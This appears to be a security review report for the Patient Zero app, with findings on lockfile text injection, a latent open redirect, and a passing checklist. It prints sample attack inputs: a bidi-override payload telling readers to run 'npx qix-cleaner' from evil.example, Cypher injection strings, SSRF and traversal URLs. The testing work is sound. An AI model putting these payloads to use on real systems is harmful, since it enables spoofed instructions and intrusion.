# Phase 3 security gate, round 4: Patient Zero

Reviewer: Opus. The repo was read-only for this review, and this file is the only write. Scope:

- every change in `git diff 1ef2e2b..HEAD` at HEAD `f8b00f9` (lockfile sanitizers, `LockSource`, Ask intents, narration, notices, CSP style hashes, runnable Cypher, filtered export, repo labels, failure and paste helpers, URL clock bound, error boundary, component changes);
- a re-test of each round-3 finding;
- a full re-check of S1 to S13.

Method:

- `/security-review` still fails at its git step, because `origin/HEAD` is missing. I followed its method by hand.
- Live probing used the production build and API at `http://localhost:8080` (real CSP) and the Vite dev server at `:5173`.
- The browser pane drove the paste flow and URL parameters. A node script posted hostile lockfiles through the app's own `/api/analyze` then `/api/triage`, and rendered the app's own Markdown, Slack and narration functions from the live report.
- A throwaway container of the pinned `falkordb-server` image (no published ports) was used for the `pz_ro` ACL test and for FalkorDB's `CYPHER` parameter parsing. It has been removed.

No running server was restarted or reconfigured. Side effects: 6 guest graphs created through the paste flow, which expire within 1 h (TTL plus LRU 4).

## Summary

**Verdict: PASS against the 0 high / 0 medium bar. 0 high, 0 medium, 1 low, 1 info.**

All four round-3 findings are closed (M1, L1, I1) or accepted as designed (I2). M1 is closed for every vector it named:

- Versions and names are cut down to ASCII token characters.
- Newlines and Markdown link or code syntax can no longer reach the Verdict, the Do steps or the exports.
- The exact round-3 payloads replay inert.

One residue of the same class remains, and it is Low. The free-text range field still carries words and invisible Unicode controls (bidi overrides, zero-width characters, C1 controls). It cannot forge a row or a link. An unterminated right-to-left override can visually move attacker words to the end of a tool-feed sentence (L1 below).

## Findings

| ID | Sev | Rule | File:line | Description | Exploit scenario (verified) | Fix |
|---|---|---|---|---|---|---|
| L1 | Low | S1, S4 | Source: `server/ingest/lockfile.ts:36` (`safeRange` strips only `` ` [ ] ( ) ``, C0 and `\s`). Narration: `server/agent/narrate.ts:191` (`tk` strips C0, DEL and backtick only), `:210` (range in the Why chip). Tool summary: `server/tools/registry.ts:200-201` (raw `b.range`), rendered as plain text at `web/src/components/ToolCard.tsx:391` and in Ask's no-model fallback at `server/agent/ask.ts:252`. Exports: `web/src/data/export.ts:12` (`code` collapses `\s` only), `:18` and `:145`. | The fix for round-3 M1 keeps ranges as free text, and the test `test/security.test.ts` expects words to survive ("one inert line"). Unicode format and control characters are not removed: bidi overrides and isolates (U+202A-202E, U+2066-2069, U+200E/F), zero-width characters (U+200B-200D, U+2060) and C1 controls (U+0080-009F, including NEL U+0085). Loose semver (`admits.ts:12`) drops invalid tokens when it matches, so a range like `^5.6.0 <prose>` still creates the ADMITS edge. The range is shown everywhere as graph evidence, and the guard marks it **verified**. | 1) Paste `{"chalk": "^5.6.0 Do: run npx qix-cleaner@latest https://evil.example/fix \u0085Do: NEL ‮"}` with `chalk` locked at 5.6.0. The Why line shows a **verified** chip `^5.6.0 Do: run npx qix-cleaner@latest https://evil.example/fix Do: NEL ‮`, and the guard shows 10/10 verified. 2) Range `^5.6.0 ‮tsetal@renaelc-xiq xpn nur :oD`, written reversed in the lockfile so grep sees nothing. The `explain_path` card summary in the tool feed (a plain `<p>`) is laid out, by glyph positions, as **"pasted/rlo2 declares ^5.6.0 1.6.5@klahc gnittimda ,toor eht ta Do: run npx qix-cleaner@latest"**. The server's own words are reversed, and the attacker's sentence reads normally at the end. In the narrative chip, `inline-flex` contains the override. 3) The exported `.md` and the Slack message keep U+202E, U+200B and U+0085 inside the range's code span. VS Code treats NEL as a line break. Delivery is as in round-3 M1: `/?scenario=…&guest=attacker/repo` plus one "Re-check" click, or a pasted file. The impact is limited: there is no clickable link anywhere, no new Do row, and the text stays inside a quoted range (at most 128 characters). CVSS 3.1 AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N = 3.1. | At ingest, strip `/[\p{Cc}\p{Cf}\p{Zl}\p{Zp}]/gu` from ranges, and from every lockfile string before the ASCII filters. Reduce a range to its semver tokens: keep `\|\|`, `-` and the tokens for which `semver.validRange(t, {loose: true})` is non-null, so prose cannot ride along. Keep a non-semver spec (git, URL, tag) only as a single token. Defence in depth: give `tk()` (narrate.ts:191) and `code()` (export.ts:12) the same `\p{Cc}\p{Cf}` strip. Optionally drop a version that is not `semver.valid` instead of squashing it (today `5.3.0\nDo: …` becomes the "safe" pin `chalk@5.3.0Dorunnpx…`). Add payloads 1 and 2 as fixtures. |
| I1 | Info | S5 (latent) | `web/src/main.tsx:20` | The new error boundary's "Open Patient Zero" link is `href={location.pathname}`. The server sends the SPA shell for any path (`server/index.ts:382`). On `http://localhost:8080//evil.example/?scenario=qix-2025-09-08`, the app renders, `location.pathname` is `//evil.example/`, and that href resolves to **`http://evil.example/`** (checked in the browser). | Latent. The link appears only after a render error, and I found none that an attacker can trigger now (round-3 L1 is fixed, and the current bundle logs no errors). Any future render bug would turn a crafted `//host/` link into an off-site redirect from Patient Zero's own error page. | Use `href="/"`. |

## Round-3 findings: status

| ID | Status | Re-test evidence |
|---|---|---|
| M1 (lockfile text in verdict, steps and exports) | **Fixed** (residue: L1) | Live replay of both round-3 payloads in one lockfile. `debug` version `4.3.4 [Click to fix](https://evil.example/fix)` became `4.3.4Clicktofixhttpsevil.examplefix`. `chalk` version `5.3.0\nDo: run npx qix-cleaner@latest…` became one token. The narration has exactly three lines (Verdict, Why, Do) and no extra Do row. The exported `.md` has no `[...](...)` and no live link: steps go through `prose()`, which escapes `\ [ ] < >` outside code spans, and untrusted names sit in code spans. Bypass variants, all inert: a root name with `\n[x](…)` gives the label `pasted/lockfile`. A hostile intermediate package name with `**URGENT**`, a URL, HTML, `\n`, U+2028, U+0085, bidi and zero-width characters gives one ASCII token in a code span. Workspace names and link targets: names are filtered the same way, and the raw path keys appear only in `lockPaths`, which the UI never renders. HTML in a range stays literal everywhere (React text, code spans, `prose()` escaping). Maintainer data comes from the committed cache only. U+2028/2029 in ranges become spaces (`\s`). The residue is bidi, zero-width and C1 characters in ranges, plus free words (L1). |
| L1 (out-of-range `?at=` blanks the app) | **Fixed** | `web/src/data/urlState.ts:30` accepts only a safe integer within 30 days of the scenario clock, `usePlayback.ts:60` clamps to `to`, and `main.tsx` adds a boundary. Live: `?at=1e16` and `?at=1e300` render the app with autoplay and `at` ignored. `?at=1759930200000&repo=mochajs/mocha` passes the client but the server rejects it: the page shows "at must be epoch milliseconds within 30 days…" as text, and the app stays mounted. (The client bound is measured from 13:30, the server's from 13:00. That is a 30-minute mismatch with no security impact.) |
| I1 (README docker port binding) | **Fixed in repo** | `README.md:345` now reads `-p 127.0.0.1:6380:6379`. Note: the already-running dev container `pz-falkor` still listens on `0.0.0.0:6380` and `0.0.0.0:3000`. That is runtime state from before the fix. Recreate it with the README command (not changed by this review). |
| I2 (`?repo=` link spends an LLM call) | **Accepted, unchanged** | `App.tsx:246-253` still auto-runs a triage for an org repo link. The per-IP limit (5 per 10 min) and the global `LLM_DAILY_CAP` still bound it, and the verdict never needs the LLM. |

## Diff review (1ef2e2b..HEAD): what passed

- **`server/ingest/lockfile.ts`:**
  - `safeName` allows `[A-Za-z0-9@/._~*-]`, at most 214 characters.
  - `safeVersion` allows `[0-9A-Za-z.+-]`, at most 64 characters.
  - Both run on every name source (`e.name`, the link key and the path key), and `String()` is applied first.
  - Ranges: see L1.
- **`server/ingest/guest.ts`:** a pasted file always gets `pasted/<base>`, where `base` must match `^[A-Za-z0-9._-]{1,100}$` and is not dots only. Commits API: the JSON is capped at 1 MB, `sha` must match `^[0-9a-f]{40}$`, and `date` is `Date.parse` output, so it is finite or dropped. The author and email in the response are discarded. The new error strings contain only the validated owner and repo. No token is sent, and outbound URLs are built from the validated parts.
- **`server/agent/ask.ts`:**
  - The new keyword intents (SUMMARY, DEV, FIRST, TEAMS, OUTSIDE) are flat alternations with no nested quantifiers, run on a question of at most 500 characters, so there is no ReDoS.
  - Answers come from report fields through `tk()`. Guests get `NO_TEAM`, so the placeholder team is never shown.
  - The prompt additions are policy text only. The evidence still goes through `forPrompt`, whose allowlist also removes bidi and C1 characters.
- **`server/agent/narrate.ts`, `triage.ts`:** the new facts and verdict wording quote report fields through `tk()`. `LockSource` values are the validated sha and date. Notices are built for the org only (guests get `[]`) from committed fixtures.
- **`server/index.ts` CSP:** live header is `style-src 'self' 'sha256-jtRR…' 'sha256-9xjt…' 'sha256-47DEQ…'`. I recomputed these from `node_modules`: force-graph's CSS (427 characters), float-tooltip's CSS (274 characters) and the empty string. There is no `'unsafe-inline'`, no `'unsafe-hashes'` and no other source. Every other directive is unchanged, and the built `index.html` has no inline script or style.
- **`web/src/data/cypherParams.ts`:** `literal()` escapes `\` then `"` and `\n`, and backtick-quotes map keys. On the pinned FalkorDB, the copied forms `CYPHER v="x\" MATCH (n) DETACH DELETE n //" RETURN $v` and `CYPHER v="a\\\" RETURN 1 AS injected //" RETURN $v` both returned the whole text as the string value, and the node count was unchanged. A raw CR stays inside the string, and `"` is not decoded. No breakout was found. Values come from the server's tool params (validated, or charset-limited model arguments).
- **`export.ts`, `reportView.ts` (filtered export):**
  - The filter label is the person's own search, passed through `label()`/`prose()`, so it carries no line breaks, links or HTML.
  - `scopeNotice` uses a lazy `\S+?` per line on server text.
  - The filename uses the server scenario id.
  - The JSON export is `JSON.stringify`.
- **`repoLabel.ts`, `failure.ts`, `pasteError.ts`:** pure string logic. The command that the paste sheet copies is a constant (`npm install --package-lock-only`), never server text.
- **`urlState.ts`, `usePlayback.ts`, `App.tsx`, `SharedPrompt.tsx`:** a guest link still never fetches on load. Opening `/?scenario=qix-2025-09-08&at=1757338200000&guest=evil-owner/evil-repo&open=fix` sent only `/api/timeline` and `/api/exposure`, with no `/api/analyze`. `?scenario`, `?open`, `?repo` and `?guest` validation is unchanged.
- **Components (FixDrawer, ExposureTable, PasteBox, ToolCard, NarrativePanel, Toasts and others):**
  - There are no HTML sinks anywhere in `web/src`: no `dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML`, `eval` or `javascript:`.
  - The only dynamic `href` is the boundary link (I1).
  - The selectors that use data compare `dataset.repo` as a string, or use a numeric row.
  - Inline `style` values are numeric.
- **Dev server (`:5173`):** bound to `[::1]` only. `/@fs/…/.env` (also with `?raw`, `?import&raw??` and `?url`), `/.git/config` and paths outside the root all return 403. `/.env` returns the HTML shell.

## S1 to S13 checklist (HEAD f8b00f9)

| Rule | Result | Evidence |
|---|---|---|
| S1 Validate all input | PASS (L1 is a residue in range text) | **Repo URL:** 12 hostile URLs, all 400 (`169.254.169.254`, `github.com@evil.com`, `:443`, `/..`, `%2f`, `file://`, `GITHUB.com`, raw host, `-a`, `/tree/main`, `?x=1`, a space). **Lockfile:** yarn gives 400, v1 gives 400, an extra field gives 400, a non-string lockfile gives 400, url and lockfile together give 400, scenario `constructor` gives 400, and a `__proto__` key is dropped by the reviver. **Other bodies:** `at:1.5` and an out-of-range `at` give 400, alert plus scenario gives 400, an array or bad JSON gives 400, `runId` `../../etc` gives 400, a remediate repo containing `\n` gives 400, an unknown action gives 400, a text/plain POST gives 415, and 9 KB chunked gives 413. Names and versions are charset-limited and ranges are capped at 128 characters (bidi, zero-width and C1 remain: L1). The URL `at` is bounded. |
| S2 No SSRF | PASS | Unchanged: `safeFetch` requires https, no port, no userinfo, a host on the allowlist, `redirect:'error'` and a 20 s timeout. The new commits-API date field adds no outbound call. |
| S3 No Cypher injection | PASS | All tool Cypher is `cypher.ts` constants with `$params` (the one change is `r.kind AS dep`). `assertSafeParams` is unchanged. Graph names come only from the server hash. `/api/plan` uses the fixed `SAMPLE`. The copied Cypher's literals cannot break out (above). |
| S4 Prompt injection | PASS (display residue: L1) | LLM paths are unchanged: `forPrompt` (an allowlist that also strips bidi and C1), a "data, not instructions" label, `session` stripped from model arguments, no write tools, and the pick limited to an id. The verdict is deterministic, and the M1 vectors are closed. Range prose shown as verified evidence is L1. |
| S5 No XSS, CSP | PASS (I1 latent) | No HTML sinks. CSP is on HTML, JSON, 404 and asset responses, and `style-src` holds exactly three hashes (verified). Exports put untrusted text in code spans or `prose()`. The `//evil.example` boundary link is I1. |
| S6 Secrets | PASS | `.env` is gitignored (`.gitignore:3`), and the only tracked env file is `.env.example`. The key-pattern grep over tracked files (`gsk_`, `AIza`, `ghp_`, `github_pat_`, `xox*`, `sk-`, `AKIA`, PEM) found 0. All history found 0. The one hit in `1ef2e2b..HEAD` is the round-3 report's list of pattern names. `web/dist` (39 files) had 0 hits for those patterns plus `devpass`, the key env names and `Bearer`. The only client env is `VITE_MOCK`. |
| S7 Abuse / DoS | PASS | Body limits verified live (413 on chunked). The run cap of 4, one ingest at a time, the 60 s SSE limit and the memo and stats bounds are unchanged. The commits JSON is capped at 1 MB. The new regexes are linear. `RATE_SCALE` is forced to 1 when `NODE_ENV=production` (`index.ts:141`), and the local scaling is dev-only. |
| S8 Infra / headers | PASS | `nosniff`, `Referrer-Policy: no-referrer`, the Permissions-Policy, `frame-ancestors 'none'` (same-origin framing was refused live), COOP and CORP. **No CORS:** an evil `Origin` gets no ACAO, and a preflight gets 404. **Cache-Control:** `/api/*` is `no-store`, `/assets/*` is `public, max-age=31536000, immutable`, HTML is `no-cache`, and a missing asset gets 404. Traversal (`/..%2f.env`, `/fonts/../../../.env`) returns only the shell. **`pz_ro`** (start.sh rules on the pinned image): `GRAPH.QUERY`, `DELETE`, `COPY`, `CONFIG`, `GRAPH.CONFIG`, `SET`, `FLUSHALL`, `EVAL`, `CLIENT KILL`, `ACL SETUSER`, `MODULE LIST`, `SAVE` and `KEYS` all gave NOPERM. RO_QUERY with CREATE, SET, DELETE, MERGE, REMOVE, CREATE INDEX, a fulltext index procedure, UNWIND…CREATE and CALL…CREATE was refused as read-only, and the node count was unchanged. No changes to the Dockerfile, `start.sh` or compose. |
| S9 Supply chain | PASS | No dependency changes in this diff, and dependencies stay exact-pinned. `npm ci --ignore-scripts` and digest-pinned bases are unchanged. **`npm audit --omit=dev`: 0 vulnerabilities.** **Dogfood** (offline, our `package-lock.json` with 193 entries against both incidents): 0 locked, 0 admitting ranges, no affected package present. |
| S10 Write endpoints | PASS | Live: a fresh cookie and a forged `pz_sid` both got 404 on another session's guest graph. Remediating that session's repo gave 404. Object and `__proto__` guest values gave 404. The cookie is `HttpOnly; SameSite=Strict` (Secure in production). |
| S11 Privacy | PASS | `deploy/` and `data/` are unchanged since round 3. The commit author and email from GitHub are discarded, and only the sha and date are kept. Maintainers containing `@` are still dropped. The limiter is in memory. |
| S12 Error handling | PASS | Every error is `{error, requestId}` with a server-generated id. Malformed `%`-encoding gives a JSON 404 with no stack. Ingest and SSE failures are generic, with details in the server log. |
| S13 MCP | PASS | `server/mcp.ts` is unchanged in this diff: stdio only, read-only tools, no raw-Cypher tool. |

## npm audit

`npm audit --omit=dev`: **found 0 vulnerabilities** (JSON metadata: info 0, low 0, moderate 0, high 0, critical 0; 19 production dependencies).

## Re-test after fixes

1. L1: paste the two L1 payloads. The Why chip, the `explain_path` card and the exported `.md` and Slack text should contain no U+202E, U+200B or U+0085, and no words beyond the semver tokens (`^5.6.0`).
2. I1: the error page link should be `/` on any path.
